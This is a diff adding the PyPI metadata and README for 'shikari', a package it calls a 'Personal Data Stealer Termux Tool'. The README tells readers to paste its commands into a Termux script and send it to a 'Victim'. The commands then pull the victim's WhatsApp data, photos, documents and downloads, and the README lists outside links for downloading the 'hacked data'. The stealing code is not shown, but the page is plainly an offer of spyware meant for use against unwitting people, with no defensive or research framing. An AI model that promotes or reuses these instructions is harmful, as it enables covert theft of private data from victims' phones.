@@ -1,0 +1,77 @@
+Metadata-Version: 2.1
+Name: shikari
+Version: 0.4
+Summary: Personal Data Stealer Termux Tool
+Home-page: https://github.com/Bhai4You/Shikari
+Author: Parixit Sutariya
+Author-email: parixit1337@gmail.com
+License: UNKNOWN
+Platform: UNKNOWN
+Classifier: Programming Language :: Python :: 2
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: OS Independent
+Description-Content-Type: text/markdown
+
+<!--
+https://pypi.org/project/shikari/
+https://pypi.org/project/shikari/
+-->
+
+[![](https://img.shields.io/pypi/pyversions/readme-generator.svg?longCache=True)](https://pypi.org/project/readme-generator/)
+
+#### Installation
+```bash
+$ pip install shikari
+```
+
+#### Features
++   **`shikari`**, **Personal Data Stealer Termux Tool**
+
+
+#### How to Use
++   **`pip install shikari`**
++   **`shikari-whatsapp`**
+
+**Paste this two code in Termux Script and Send to your Victim !! then Shikari Automatically Shikar and Hack Victim whatsapp Data ^^**
+
+
+
+#### Menu Options :
+```
+$ shikari
+
+shikari-home
+shikari-dcim
+shikari-doc
+shikari-pic
+shikari-download
+shikari-whatsapp
+shikari-movie
+
+Created by Parixit Sutariya
+Github : github.com/Bhai4You
+Youtube : youtube.com/BullAnonymous
+
+```
+
+#### How to Hack Whatsapp ?
+```
+$ shikari-whatsapp
+
+```
+
+#### How to Download Hacked Data ?
++    <a href="http://scnc.co.za/shikari.txt">Shikari Link 1</a>
++    <a href="http://ayk.co.za/shikari.txt">Shikari Link 2</a>
++    <a href="http://foodconsult.co.za/shikari.txt">Shikari Link 3</a>
+
+
+
+
+
+
+<p align="center">
+    <a href="https://pypi.org/project/shikari/">Shikari Tool</a>
+</p>
+
+
